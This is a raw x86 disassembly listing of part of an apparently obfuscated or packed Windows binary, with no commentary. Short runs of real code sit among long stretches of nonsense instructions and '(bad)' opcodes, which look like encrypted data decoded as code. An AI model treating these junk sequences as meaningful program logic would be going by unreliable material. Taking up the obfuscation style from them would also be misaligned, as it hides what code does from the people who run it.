  40e41c:	adc    bh,BYTE PTR [edi+0x7e]
  40e41f:	jle    0x40e3c3
  40e421:	push   cs
  40e422:	ret    
  40e423:	pop    es
  40e424:	dec    edx
  40e425:	and    ecx,0xee8b4762
  40e42b:	in     eax,dx
  40e42c:	push   esi
  40e42d:	dec    edi
  40e42e:	add    eax,0x77e3692f
  40e433:	fcom   QWORD PTR [edi+0x3d]
  40e436:	mov    es,eax
  40e438:	xor    BYTE PTR [ecx],0x31
  40e43b:	pop    ss
  40e43c:	ins    BYTE PTR es:[edi],dx
  40e43d:	loop   0x40e435
  40e43f:	xchg   edx,eax
  40e440:	repnz cs mov dh,0x9
  40e444:	dec    edx
  40e445:	xchg   BYTE PTR [ebx-0x7],bh
  40e448:	inc    edx
  40e449:	test   DWORD PTR ds:0xf88863c3,ecx
  40e44f:	add    eax,0xe1b3aa59
  40e454:	xor    dl,BYTE PTR [eax]
  40e456:	shl    DWORD PTR [ebx],1
  40e458:	pop    ebx
  40e459:	dec    eax
  40e45a:	mov    al,0xef
  40e45c:	cmp    edi,DWORD PTR [edi+0x29b5935d]
  40e462:	mov    ah,0x98
  40e464:	jb     0x40e487
  40e466:	adc    ah,BYTE PTR [ebx+0x39]
  40e469:	push   DWORD PTR [edi]
  40e46b:	mov    ch,0xd4
  40e46d:	test   DWORD PTR [eax-0xf],ecx
  40e470:	cmp    eax,0xbe9bf39b
  40e475:	sub    al,0x53
  40e477:	lods   al,BYTE PTR ds:[esi]
  40e478:	ret    0xc09c
  40e47b:	lods   eax,DWORD PTR ds:[esi]
  40e47c:	cdq    
  40e47d:	pop    ebx
  40e47e:	jne    0x40e4e5
  40e480:	ja     0x40e43b
  40e482:	xchg   edi,ecx
  40e484:	out    dx,al
  40e485:	fsubr  QWORD PTR [edx-0x65737b52]
  40e48b:	test   esp,ecx
  40e48d:	xchg   ecx,eax
  40e48e:	stos   BYTE PTR es:[edi],al
  40e48f:	popa   
  40e490:	dec    esp
  40e491:	enter  0xfd6b,0x2e
  40e495:	mov    eax,ecx
  40e497:	popa   
  40e498:	jmp    0x3877:0x9b8eddfa
  40e49f:	mov    dh,0x74
  40e4a1:	pushf  
  40e4a2:	mov    fs,WORD PTR [ebp-0x43a59888]
  40e4a8:	imul   eax,DWORD PTR [ebp-0x18342b4b],0xc82842d6
  40e4b2:	adc    eax,0x54571e47
  40e4b7:	mov    ch,0xa5
  40e4b9:	cdq    
  40e4ba:	je     0x40e46f
  40e4bc:	(bad)
  40e4bf:	call   ecx
  40e4c1:	jae    0x40e49c
  40e4c3:	and    BYTE PTR [ebx],cl
  40e4c5:	mov    ah,0x20
  40e4c7:	in     eax,0x47
  40e4c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4ca:	sub    bl,BYTE PTR [ebp+0x3c]
  40e4cd:	add    al,0x37
  40e4cf:	pop    esi
  40e4d0:	cmc    
  40e4d1:	bound  esi,QWORD PTR [eax+0x4948ab2b]
  40e4d7:	xchg   ecx,eax
  40e4d8:	test   esp,esi
  40e4da:	xchg   ecx,eax
  40e4db:	cmp    al,0x1d
  40e4dd:	mov    al,0xf1
  40e4df:	push   ebx
  40e4e0:	jge    0x40e521
  40e4e2:	lea    esi,[ebp-0x10916c45]
  40e4e8:	in     eax,0x4e
  40e4ea:	sbb    esp,edx
  40e4ec:	inc    ebp
  40e4ed:	mov    bh,0x4a
  40e4ef:	retf   
  40e4f0:	(bad)  [edx+0x22fad09a]
  40e4f6:	cmp    ah,BYTE PTR [edi-0x4887f5b4]
  40e4fc:	fptan  
  40e4fe:	in     al,0xc9
  40e500:	cli    
  40e501:	loope  0x40e4f2
  40e503:	or     DWORD PTR [ebx+0x40],ebp
  40e506:	scas   eax,DWORD PTR es:[edi]
  40e507:	push   ebx
  40e508:	mov    ss,WORD PTR ds:0xf537a109
  40e50e:	ret    0xe253
  40e511:	push   edi
  40e512:	mov    esp,0xc15d77f8
  40e517:	cli    
  40e518:	iret   
  40e519:	arpl   WORD PTR [ebx-0x5b809e1f],bp
  40e51f:	bound  eax,QWORD PTR [eax-0x4b610eb3]
  40e525:	lods   al,BYTE PTR ds:[esi]
  40e526:	xchg   edx,eax
  40e527:	js     0x40e525
  40e529:	outs   dx,DWORD PTR ds:[esi]
  40e52a:	ret    0x865d
  40e52d:	lds    eax,FWORD PTR [edi-0x6a]
  40e530:	call   0xb54da965
  40e535:	lods   eax,DWORD PTR ds:[esi]
  40e536:	popa   
  40e537:	loope  0x40e4bd
  40e539:	ret    0x6bfd
  40e53c:	mov    eax,DWORD PTR [ebp-0xc]
  40e53f:	or     DWORD PTR ds:0x4336a3,0x4336eb
  40e549:	xor    eax,esi
  40e54b:	add    eax,ebx
  40e54d:	sbb    DWORD PTR ds:0x4336db,0x4336af
  40e557:	mov    DWORD PTR [ebp-0x54],eax
  40e55a:	lea    eax,[ebp-0x1c]
  40e55d:	mov    DWORD PTR [ebp-0x50],eax
  40e560:	mov    eax,DWORD PTR [ebp-0x60]
  40e563:	xor    eax,esi
  40e565:	add    eax,ebx
  40e567:	mov    DWORD PTR [ebp-0x60],eax
  40e56a:	lea    eax,[ebp-0x60]
  40e56d:	push   eax
  40e56e:	mov    eax,DWORD PTR [ebp+0xc]
  40e571:	xor    eax,esi
  40e573:	add    eax,ebx
  40e575:	push   eax
  40e576:	mov    eax,ds:0x413b54
  40e57b:	push   0x413aaa
  40e580:	push   DWORD PTR [eax]
  40e582:	call   0x40984d
  40e587:	jmp    0x40e830
  40e58c:	cmp    edi,0x13d
  40e592:	jne    0x40e830
  40e598:	mov    eax,DWORD PTR [ebp-0x10]
  40e59b:	xor    eax,esi
  40e59d:	add    eax,ebx
  40e59f:	mov    DWORD PTR [ebp+0x8],eax
  40e5a2:	jmp    0x40e6db
  40e5a7:	shl    BYTE PTR [eax+eax*8-0xf8f9fd0],0x74
  40e5af:	sub    eax,0x25f261b8
  40e5b4:	mov    edi,0x992a9ad1
  40e5b9:	jle    0x40e639
  40e5bb:	adc    bh,BYTE PTR [edi+0x7e]
  40e5be:	jle    0x40e5d6
  40e5c0:	ins    BYTE PTR es:[edi],dx
  40e5c1:	(bad)  
  40e5c2:	mov    ch,BYTE PTR [eax-0x4df3fa8f]
  40e5c8:	(bad)  
  40e5cb:	out    dx,eax
  40e5cc:	adc    DWORD PTR [ebx-0x53],esp
  40e5cf:	rcr    esi,1
  40e5d1:	mov    ebp,0x1a19fce9
  40e5d6:	push   ebp
  40e5d7:	stos   BYTE PTR es:[edi],al
  40e5d8:	(bad)  
  40e5d9:	cmc    
  40e5da:	inc    ebx
  40e5db:	xchg   ecx,eax
  40e5dc:	lods   al,BYTE PTR ds:[esi]
  40e5dd:	inc    esi
  40e5de:	fld    DWORD PTR [esi]
  40e5e0:	(bad)  
  40e5e1:	scas   eax,DWORD PTR es:[edi]
  40e5e2:	int3   
  40e5e3:	jo     0x40e628
  40e5e5:	add    BYTE PTR [ebx+0x41],cl
  40e5e8:	call   0xfa06:0x936dc14
  40e5ef:	(bad)  
  40e5f1:	sbb    ch,BYTE PTR [eax]
  40e5f3:	(bad)  [ecx-0x2f]
  40e5f6:	scas   al,BYTE PTR es:[edi]
  40e5f7:	mov    esi,0x460956dc
  40e5fc:	cmp    al,BYTE PTR [edi-0x282fb185]
  40e602:	xchg   edi,eax
  40e603:	ret    
  40e604:	mov    eax,eax
  40e606:	lea    ebx,[ebx-0x23c6f3a5]
  40e60c:	sub    BYTE PTR [ebx],bh
  40e60e:	aam    0x32
  40e610:	dec    ebp
  40e611:	inc    ebp
  40e612:	xor    BYTE PTR [esi-0x61],ch
  40e615:	fwait
  40e616:	xor    eax,0xbd81e9ec
  40e61b:	retf   0x5104
  40e61e:	loop   0x40e675
  40e620:	sbb    al,0xbe
  40e622:	mov    al,0x41
  40e624:	push   eax
  40e625:	xlat   BYTE PTR ds:[ebx]
  40e626:	dec    esi
  40e627:	inc    edx
  40e628:	xor    eax,0x49c0e215
  40e62d:	push   cs
  40e62e:	inc    edi
  40e62f:	pop    edi
  40e630:	js     0x40e693
  40e632:	push   eax
  40e633:	xor    BYTE PTR [edx-0x3c],0x96
  40e637:	push   cs
  40e638:	sbb    ebx,esi
  40e63a:	add    dh,BYTE PTR [eax+0x20]
  40e63d:	adc    eax,0x64fd35e
  40e642:	inc    eax
  40e643:	das    
  40e644:	dec    edi
  40e645:	jae    0x40e6a9
  40e647:	xchg   DWORD PTR [edi-0x23c8f8d8],edx
  40e64d:	ins    BYTE PTR es:[edi],dx
  40e64e:	or     esi,0x5aac5dd9
  40e654:	rol    BYTE PTR [edi+0x74571f5c],0x59
  40e65b:	push   esp
  40e65c:	adc    bl,ah
  40e65e:	jmp    0x33c01930
  40e663:	xor    BYTE PTR [edx+0x68],dl
  40e666:	push   DWORD PTR [edx]
  40e668:	pop    ebx
  40e669:	test   DWORD PTR [eax+0x76],0xc36282d7
  40e670:	jne    0x40e64b
  40e672:	push   edi
  40e673:	cli    
  40e674:	loope  0x40e664
  40e676:	xchg   edi,eax
  40e677:	jns    0x40e68e
  40e679:	bound  eax,QWORD PTR [eax+ebp*2-0x5e]
  40e67d:	cld    
  40e67e:	(bad)  
  40e67f:	or     dh,BYTE PTR [edi]
  40e681:	(bad)  
  40e682:	std    
  40e683:	rol    DWORD PTR [edx-0x412d8510],1
  40e689:	xchg   edi,eax
  40e68a:	jns    0x40e6e9
  40e68c:	aaa    
  40e68d:	mov    al,0xe7
  40e68f:	test   DWORD PTR [eax-0x4f2f62b5],esp
  40e695:	and    BYTE PTR [esi-0x45338900],ch
  40e69b:	loope  0x40e69d
  40e69d:	sub    BYTE PTR [ebp-0x1d93c6a8],dh
  40e6a3:	mul    DWORD PTR [edi+0x17]
  40e6a6:	push   0xad85d336
  40e6ab:	or     cl,BYTE PTR ds:0xdb5290c6
  40e6b1:	ds add al,0xd2
  40e6b4:	mov    DWORD PTR [ecx],ebx
  40e6b6:	push   ebx
  40e6b7:	pushf  
  40e6b8:	push   ebx
  40e6b9:	inc    ebp
  40e6ba:	sub    eax,0xf29f3cc3
  40e6bf:	loop   0x40e70d
  40e6c1:	sub    DWORD PTR ds:0x195d3ba3,ebx
  40e6c7:	pop    eax
  40e6c8:	stos   BYTE PTR es:[edi],al
  40e6c9:	popa   
  40e6ca:	adc    dh,dh
  40e6cc:	retf   
  40e6cd:	fnstsw WORD PTR [edx]
  40e6cf:	jmp    0xf55f76f
  40e6d4:	dec    esi
  40e6d5:	(bad)  
  40e6d6:	adc    dh,dh
  40e6d8:	lahf   
  40e6d9:	xchg   DWORD PTR [ebx],esp
  40e6db:	mov    eax,ds:0x413b34
  40e6e0:	mov    DWORD PTR [ebp+0x8],eax
  40e6e3:	mov    eax,DWORD PTR [ebp-0x14]
  40e6e6:	jmp    0x40e81f
  40e6eb:	jb     0x40e70f
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	jmp    0x9bdf:0xa270706c
  40e6f5:	mov    al,BYTE PTR [ecx-0x2e7a6389]
  40e6fb:	into   
  40e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fd:	jle    0x40e77d
  40e6ff:	adc    bh,BYTE PTR [edi+0x7e]
  40e702:	jle    0x40e715
  40e704:	bnd jb 0x40e742
  40e707:	es push cs
  40e709:	in     eax,dx
  40e70a:	mov    ah,0x69
  40e70c:	push   ebx
  40e70d:	ins    BYTE PTR es:[edi],dx
  40e70e:	jecxz  0x40e725
  40e710:	or     DWORD PTR [edi],ecx
  40e712:	rcr    BYTE PTR [eax+0x77],0x24
  40e716:	mov    al,ds:0x94255e97
  40e71b:	and    BYTE PTR [eax+0x32d35ccd],dl
  40e721:	mov    bl,0xff
  40e723:	lods   al,BYTE PTR ds:[esi]
  40e724:	test   al,0x7b
  40e726:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e727:	xchg   edi,eax
  40e728:	test   al,0xc9
  40e72a:	mov    ah,0xfa
  40e72c:	jge    0x40e769
  40e72e:	mov    al,0xf8
  40e731:	popf   
  40e732:	lods   al,BYTE PTR ds:[esi]
  40e733:	mov    esp,0x979d3b17
  40e738:	jbe    0x40e725
  40e73a:	mov    edx,0x2dfe5719
  40e73f:	ins    DWORD PTR es:[edi],dx
  40e740:	inc    ecx
  40e741:	fmul   QWORD PTR [esi-0x6ee3a5e2]
  40e747:	mov    ecx,0x8d1c8ab2
  40e74c:	mov    ch,0xe3
  40e74e:	lods   eax,DWORD PTR ds:[esi]
  40e74f:	emms   
  40e751:	lahf   
  40e752:	cmc    
  40e753:	fwait
  40e754:	xchg   BYTE PTR [ecx+0x5d],al
  40e757:	mov    edx,0xff13d1fa
  40e75c:	cmp    edx,DWORD PTR ds:0x1df5daa0
  40e762:	imul   esi,DWORD PTR [edx],0x59c8204a
  40e768:	push   DWORD PTR [edx+0x1b158041]
  40e76e:	into   
  40e76f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e770:	and    al,0xe8
  40e772:	mov    esp,0x85766a34
  40e777:	xchg   esp,eax
  40e778:	sbb    ebp,DWORD PTR [edi]
  40e77a:	sub    al,BYTE PTR [ecx+edi*4-0x74]
  40e77e:	(bad)  
  40e77f:	cmp    eax,0x4d633924
  40e784:	adc    DWORD PTR [ebp-0x5d],edx
  40e787:	sti    
  40e788:	nop
  40e789:	ror    BYTE PTR [eax],0x1a
  40e78c:	mov    al,ds:0xe8ac0f26
  40e791:	jle    0x40e77d
  40e793:	or     al,0x79
  40e795:	push   edx
  40e796:	fisub  WORD PTR [ebp+edi*8+0x1c856198]
  40e79d:	jb     0x40e7b1
  40e79f:	sahf   
  40e7a0:	mov    cl,0x7a
  40e7a2:	repnz mov dl,0xf6
  40e7a5:	jmp    0x454a:0x1119a837
  40e7ac:	jmp    0x40e7f7
  40e7ae:	js     0x40e7a5
  40e7b0:	xchg   edi,eax
  40e7b1:	adc    BYTE PTR [edi],bh
  40e7b3:	stc    
  40e7b4:	loopne 0x40e7cf
  40e7b6:	sub    cl,BYTE PTR [edx+0x6e]
  40e7b9:	cmp    eax,0x9ae0467f
  40e7be:	add    BYTE PTR [ebp-0x13],ah
  40e7c1:	imul   ebp,DWORD PTR [esi-0x354707c1],0x693feabc
  40e7cb:	mov    al,ds:0x655564ff
  40e7d0:	imul   edx,DWORD PTR [ecx+0x5b0396b4],0x2a29e64a
  40e7da:	and    esp,DWORD PTR [ebp+0x498b3936]
  40e7e0:	cwde   
  40e7e1:	cld    
  40e7e2:	(bad)  
  40e7e3:	nop
  40e7e4:	rcr    DWORD PTR [esi+0x73],cl
  40e7e7:	aad    0x9e
  40e7e9:	popa   
  40e7ea:	jns    0x40e82c
  40e7ec:	(bad)  
  40e7ed:	mov    dh,0x76
  40e7ef:	cmp    al,0xf9
  40e7f1:	or     DWORD PTR ds:[esi],0xffffff88
  40e7f5:	fidivr DWORD PTR [ecx+0x4df15714]
  40e7fb:	cpuid  
  40e7fd:	xor    al,0x10
  40e7ff:	xor    ebp,ebp
  40e801:	dec    ecx
  40e802:	in     eax,0xf9
  40e804:	jno    0x40e788
  40e806:	sbb    eax,0xd6e42812
  40e80b:	pop    ebp
  40e80c:	sbb    eax,DWORD PTR [ecx]
  40e80e:	and    DWORD PTR [edx],ecx
  40e810:	(bad)  
  40e811:	in     al,0x9e
  40e813:	test   eax,0x66dde4e
  40e818:	push   edx
  40e819:	ins    DWORD PTR es:[edi],dx
  40e81a:	mov    ecx,0xeafdaaef
  40e81f:	mov    DWORD PTR [ebp-0x4],eax
  40e822:	mov    eax,DWORD PTR [ebp-0x4]
  40e825:	push   0x4
  40e827:	pop    ecx
  40e828:	sub    ecx,eax
  40e82a:	add    ecx,DWORD PTR [ebp-0x18]
  40e82d:	mov    DWORD PTR [ebp-0x8],ecx
  40e830:	mov    eax,DWORD PTR [ebp+0xc]
  40e833:	xor    eax,esi
  40e835:	lea    edi,[edi+eax*1+0x32729b]
  40e83c:	cmp    edi,0x50b
  40e842:	jmp    0x40e97b
  40e847:	xor    al,0xd8
  40e849:	xchg   ebx,eax
  40e84a:	das    
  40e84b:	push   ebx
  40e84c:	jne    0x40e7fe
  40e84e:	loope  0x40e887
  40e850:	jecxz  0x40e800
  40e852:	loope  0x40e812
  40e854:	sbb    al,0x46
  40e856:	mov    ah,0xe2
  40e858:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e859:	jle    0x40e8d9
  40e85b:	adc    bh,BYTE PTR [edi+0x7e]
  40e85e:	jle    0x40e8cd
  40e860:	sub    bh,ah
  40e862:	sbb    DWORD PTR gs:[edi],edi
  40e865:	cdq    
  40e866:	test   DWORD PTR [esi-0x7e1987e],esi
  40e86c:	mov    ch,bh
  40e86e:	(bad)  [esi-0x2b60bcdd]
  40e874:	leave  
  40e875:	add    ch,BYTE PTR [esi+0x53]
  40e878:	push   esp
  40e879:	mov    cl,0xfb
  40e87b:	out    0xc5,al
  40e87d:	xchg   ebx,eax
  40e87e:	jb     0x40e81c
  40e880:	push   ebx
  40e881:	in     eax,0x2e
  40e883:	jne    0x40e883
  40e885:	jns    0x40e881
  40e887:	es cli 
  40e889:	dec    esi
  40e88a:	sbb    eax,0x82e1cec2
  40e88f:	scas   al,BYTE PTR es:[edi]
  40e890:	xchg   esp,eax
  40e891:	inc    edx
  40e892:	adc    ch,BYTE PTR [bx+0x8]
  40e896:	push   esp
  40e897:	fdiv   QWORD PTR [ecx+0x6a11090d]
  40e89d:	shl    BYTE PTR ds:0xfc15f43,cl
  40e8a3:	fwait
  40e8a4:	xchg   edx,eax
  40e8a5:	test   BYTE PTR [edi+edx*8+0x16e346cd],0x20
  40e8ad:	outs   dx,DWORD PTR ds:[esi]
  40e8ae:	out    dx,eax
  40e8af:	in     al,dx
  40e8b0:	bound  esi,QWORD PTR [edx+edx*4+0x100c06f0]
  40e8b7:	mov    ebx,0x1e8c9107
  40e8bc:	fldenv ds:0x22b90646
  40e8c2:	int    0x1
  40e8c4:	sbb    edi,DWORD PTR [eax-0x73]
  40e8c7:	call   0xd6e9:0xe3e1e52d
  40e8ce:	loope  0x40e913
  40e8d0:	xchg   ebp,eax
  40e8d1:	add    al,dh
  40e8d3:	dec    eax
  40e8d4:	or     dh,ch
  40e8d6:	xor    ebx,DWORD PTR [esi+0x42d9e7d9]
  40e8dc:	and    dh,BYTE PTR [ebp+0x67ad5907]
  40e8e2:	mov    esi,0xc3d392d3
  40e8e7:	and    edx,DWORD PTR [eax]
  40e8e9:	cmp    al,0x46
  40e8eb:	sub    ebx,DWORD PTR [eax-0x19e3dbad]
  40e8f1:	inc    esi
  40e8f2:	inc    ecx
  40e8f3:	(bad)  
  40e8f4:	inc    edx
  40e8f6:	xor    dh,BYTE PTR [ebx]
  40e8f8:	mov    eax,0x822ffe96
  40e8fd:	data16 add BYTE PTR es:[edi],dh
  40e901:	aad    0x51
  40e903:	mov    dh,BYTE PTR [ecx]
  40e905:	por    mm2,QWORD PTR [edx+0x4c]
  40e909:	push   ebx
  40e90a:	push   ecx
  40e90b:	push   esi
  40e90c:	pusha  
  40e90d:	(bad)  
  40e90e:	xchg   edx,eax
  40e90f:	test   al,0x17
  40e911:	ins    DWORD PTR es:[edi],dx
  40e912:	scas   eax,DWORD PTR es:[edi]
  40e913:	xchg   esi,eax
  40e914:	pop    edi
  40e915:	not    BYTE PTR [ecx-0x5e]
  40e918:	(bad)  
  40e919:	ror    BYTE PTR [edx-0x4bbf51b7],1
  40e91f:	mov    esi,0x4baeb485
  40e924:	(bad)  
  40e925:	or     esp,DWORD PTR [ebx]
  40e927:	in     al,0x7d
  40e929:	adc    eax,DWORD PTR [esi]
  40e92b:	test   DWORD PTR [ecx+0x4a],ecx
  40e92e:	retf   
  40e92f:	dec    esp
  40e930:	or     al,0x27
  40e932:	call   0x75e0e4df
  40e937:	cld    
  40e938:	adc    eax,eax
  40e93a:	mov    eax,ds:0xabd73d23
  40e93f:	in     eax,0x66
  40e941:	div    bl
  40e943:	mov    ebx,0xb72071e6
  40e948:	ins    DWORD PTR es:[edi],dx
  40e949:	add    DWORD PTR [esi],esp
  40e94b:	cmp    eax,0x6199eca3
  40e950:	xor    BYTE PTR [eax+0x6a782b78],bh
  40e956:	js     0x40e982
  40e958:	jnp    0x40e8fb
  40e95a:	jle    0x40e914
  40e95c:	jo     0x40e9a7
  40e95e:	sub    dh,dh
  40e960:	stc    
  40e961:	sub    al,0x49
  40e963:	mov    ebx,0xf7754f26
  40e968:	lods   eax,DWORD PTR ds:[esi]
  40e969:	adc    bl,BYTE PTR [esi+esi*8]
  40e96c:	test   eax,0xefd65e23
  40e971:	and    eax,0x3125d030
  40e976:	adc    bh,0xe6
  40e979:	cmp    DWORD PTR [eax-0x6c17af1],edx
  40e97f:	(bad)  
  40e980:	dec    DWORD PTR [ebx+0x335f0c45]
  40e986:	(bad)  
  40e987:	pop    esi
  40e988:	jmp    0x40eac1
  40e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e98e:	sbb    bl,dh
  40e990:	loope  0x40ea05
  40e992:	icebp  
  40e993:	mov    ch,0x58
  40e995:	jns    0x40e920
  40e997:	add    eax,0x3423051d
  40e99c:	or     al,BYTE PTR [esi+0x127e7ea4]
  40e9a2:	jg     0x40ea22
  40e9a4:	jle    0x40e947
  40e9a6:	mov    dx,0x3775
  40e9aa:	and    eax,ebp
  40e9ac:	shr    DWORD PTR [ebx],0x16
  40e9af:	pop    ds
  40e9b0:	jo     0x40e98c
  40e9b2:	(bad)  
  40e9b4:	pop    ebx
  40e9b5:	imul   ecx,DWORD PTR [ebx+esi*4+0x40],0x3f
  40e9ba:	test   DWORD PTR [ebx-0xd],esi
  40e9bd:	fnstenv [eax-0x2e]
  40e9c0:	pop    eax
  40e9c1:	jge    0x40e96e
  40e9c3:	ss mov esp,0x2abc86ab
  40e9c9:	mov    edx,0x7d11fdef
  40e9ce:	aaa    
  40e9cf:	ins    DWORD PTR es:[edi],dx
  40e9d0:	(bad)  
  40e9d1:	(bad)  [ebx]
  40e9d3:	jmp    0x12e133cf
  40e9d8:	aad    0x90
  40e9da:	sbb    esi,DWORD PTR [ecx-0x2a]
  40e9dd:	sub    eax,0x3b199d23
  40e9e2:	pop    ss
  40e9e3:	adc    BYTE PTR [ecx+0x3b3d13f7],dl
  40e9e9:	dec    ecx
  40e9ea:	pop    edi
  40e9eb:	sbb    al,0xbd
  40e9ed:	mul    DWORD PTR [ebp+0x13]
  40e9f0:	out    dx,al
  40e9f1:	sahf   
  40e9f2:	xchg   ebp,eax
  40e9f3:	cdq    
  40e9f4:	adc    DWORD PTR [ecx-0x70],esi
  40e9f7:	push   edi
  40e9f8:	sbb    esp,DWORD PTR [ecx*1-0x366f39ad]
  40e9ff:	gs mov bh,0x21
  40ea02:	push   ds
  40ea03:	scas   al,BYTE PTR es:[edi]
  40ea04:	in     al,0xbe
  40ea06:	push   esp
  40ea07:	mov    ebp,0x9e0ca97f
  40ea0c:	(bad)  
  40ea0d:	imul   eax,eax,0x3333f5ed
  40ea13:	cmp    al,BYTE PTR [eax+0x2b5f165f]
  40ea19:	or     eax,DWORD PTR [edi-0xe]
  40ea1c:	sbb    DWORD PTR [ebp+0x12],esi
  40ea1f:	sub    BYTE PTR ds:0xb137ab75,bl
  40ea25:	xchg   BYTE PTR [edx],cl
  40ea27:	jmp    0x40ea3b
  40ea29:	call   0xde274ffd
  40ea2e:	lods   al,BYTE PTR ds:[esi]
  40ea2f:	sub    eax,0x1c06dfd
  40ea34:	sub    al,0x66
  40ea36:	cs retf 0x34a8
  40ea3a:	sbb    dl,0x77
  40ea3d:	fstp   QWORD PTR [edx-0x45]
  40ea40:	xor    eax,DWORD PTR [esi]
  40ea42:	push   ebp
  40ea43:	inc    ecx
  40ea44:	stos   DWORD PTR es:[edi],eax
  40ea45:	cmp    ebx,DWORD PTR [esi+0x59]
  40ea48:	test   eax,0xd2ea55b
  40ea4d:	out    0x93,eax
  40ea4f:	call   0xcbdf:0x5109d1
  40ea56:	std    
  40ea57:	pop    eax
  40ea58:	mov    ebx,0x758b765
  40ea5d:	das    
  40ea5e:	lods   al,BYTE PTR ds:[esi]
  40ea5f:	cwde   
  40ea60:	addr16 pusha 
  40ea62:	scas   al,BYTE PTR es:[edi]
  40ea63:	lahf   
  40ea64:	iret   
  40ea65:	mov    ch,0x6d
  40ea67:	enter  0xad45,0xa1
  40ea6b:	sbb    al,0x98
  40ea6d:	dec    esi
  40ea6e:	cmp    al,0x89
  40ea70:	cdq    
  40ea71:	ins    BYTE PTR es:[edi],dx
  40ea72:	mov    ebp,DWORD PTR [ecx]
  40ea74:	add    eax,DWORD PTR [ebx+0x5eb7dece]
  40ea7a:	shl    BYTE PTR [eax-0x31],0x91
  40ea7e:	out    0x8d,eax
  40ea80:	mov    ds:0x6166ee6e,eax
  40ea85:	xchg   BYTE PTR [ecx],bh
  40ea87:	mov    edx,0xd15852ae
  40ea8c:	rol    BYTE PTR [ebp+0x65],cl
  40ea8f:	push   eax
  40ea90:	adc    eax,0x56f71a06
  40ea95:	or     eax,0x7495c510
  40ea9a:	push   edi
  40ea9b:	icebp  
  40ea9c:	adc    eax,0x5ffc0edd
  40eaa1:	fld    st(1)
  40eaa3:	jg     0x40eaa8
  40eaa5:	jns    0x40ea3e
  40eaa7:	pop    ebx
  40eaa8:	add    edx,0x56
  40eaab:	jnp    0x40ea40
  40eaad:	mov    ecx,0x1ce3902a
  40eab2:	pop    ecx
  40eab3:	ds pop edi
  40eab5:	popa   
  40eab6:	push   ebp
  40eab7:	push   edx
  40eab8:	(bad)  
  40eaba:	mov    ebp,0x21dd4577
  40eabf:	dec    eax
  40eac0:	adc    al,BYTE PTR [ebx]
  40eac2:	ret    
  40eac3:	pop    ebx
  40eac4:	leave  
  40eac5:	ret    0x8
  40eac8:	push   ebp
  40eac9:	mov    ebp,esp
  40eacb:	push   ecx
  40eacc:	mov    DWORD PTR ds:0x433693,0x1f
  40ead6:	cmp    DWORD PTR ds:0x433693,0x0
  40eadd:	je     0x40eb79
  40eae3:	cmp    DWORD PTR ds:0x433693,0xc
  40eaea:	jne    0x40eafe
  40eaf0:	push   0x1b35
  40eaf5:	push   DWORD PTR [ebp-0x14]
  40eaf8:	call   DWORD PTR ds:0x412368
  40eafe:	cmp    DWORD PTR ds:0x433693,0xd
  40eb05:	jne    0x40eb18
  40eb0b:	mov    edx,DWORD PTR ds:0x433693
  40eb11:	dec    edx
  40eb12:	mov    DWORD PTR ds:0x433693,edx
  40eb18:	mov    edx,DWORD PTR ds:0x433693
  40eb1e:	dec    edx
  40eb1f:	mov    DWORD PTR ds:0x433693,edx
  40eb25:	jmp    0x40ead6
  40eb2a:	mov    DWORD PTR ds:0x4336d3,0x16
  40eb34:	cmp    DWORD PTR ds:0x4336d3,0x0
  40eb3b:	je     0x40eb79
  40eb41:	cmp    DWORD PTR ds:0x4336d3,0x17
  40eb48:	jne    0x40eb5f
  40eb4e:	push   DWORD PTR [ebp-0x14]
  40eb51:	push   DWORD PTR [ebp-0xc]
  40eb54:	push   0x495a
  40eb59:	call   DWORD PTR ds:0x4120ec
  40eb5f:	mov    eax,ds:0x4336d3
  40eb64:	dec    eax
  40eb65:	mov    ds:0x4336d3,eax
  40eb6a:	jmp    0x40eb34
  40eb6f:	mov    DWORD PTR ds:0x4336e3,0x352
  40eb79:	push   ecx
  40eb7a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40eb81:	sbb    DWORD PTR ds:0x43369b,edx
  40eb87:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40eb8e:	mov    eax,DWORD PTR [ebp-0x4]
  40eb91:	push   esi
  40eb92:	add    DWORD PTR ds:0x43372b,ebx
  40eb98:	mov    esi,DWORD PTR [ebp-0x8]
  40eb9b:	adc    ecx,edx
  40eb9d:	mov    edx,0x7510854
  40eba2:	jmp    0x40ed99
  40eba7:	imul   ebx,DWORD PTR [ebx+0x72cf420f],0x73
  40ebae:	mov    bl,0xda
  40ebb0:	jecxz  0x40eb5f
  40ebb2:	sbb    bh,dh
  40ebb4:	jmp    0x7e7e:0xa59a2713
  40ebbb:	push   esp
  40ebbc:	jg     0x40ec3c
  40ebbe:	jle    0x40eb9e
  40ebc0:	jmp    0x40ebfc
  40ebc2:	or     eax,0xbc14832b
  40ebc7:	mov    esi,0xe41de327
  40ebcc:	cmp    BYTE PTR [edi+ecx*2-0x12417c58],cl
  40ebd3:	popf   
  40ebd4:	pop    edx
  40ebd5:	bound  esp,QWORD PTR [ebx+ebx*1-0xb]
  40ebd9:	gs jno 0x40eb6f
  40ebdc:	imul   ebp,edi,0xe
  40ebdf:	data16 add al,0x11
  40ebe2:	xor    DWORD PTR [ebx+ecx*1+0xa11cf32],ecx
  40ebe9:	fld    DWORD PTR [ecx]
  40ebeb:	popf   
  40ebec:	cs pop ecx
  40ebee:	xchg   edi,eax
  40ebef:	sub    BYTE PTR [edi],cl
  40ebf1:	pushf  
  40ebf2:	and    eax,0x402b4c70
  40ebf7:	lahf   
  40ebf8:	aam    0xbf
  40ebfa:	mov    ebp,0xecfc3e87
  40ebff:	mov    edi,DWORD PTR [eax+0x39]
  40ec02:	mov    bl,0xb7
  40ec04:	pslld  mm1,QWORD PTR [ecx+0x1d710293]
  40ec0b:	push   cs
  40ec0c:	scas   eax,DWORD PTR es:[edi]
  40ec0d:	sub    dl,BYTE PTR [ecx+0x7ece9bcb]
  40ec13:	cmp    dl,0x5
  40ec16:	inc    edi
  40ec17:	cli    
  40ec18:	fldcw  WORD PTR [ecx]
  40ec1a:	mov    ebp,0x2e597f51
  40ec1f:	out    dx,eax
  40ec20:	bnd jge 0x40ec3f
  40ec23:	jl     0x40ec64
  40ec25:	pop    ebp
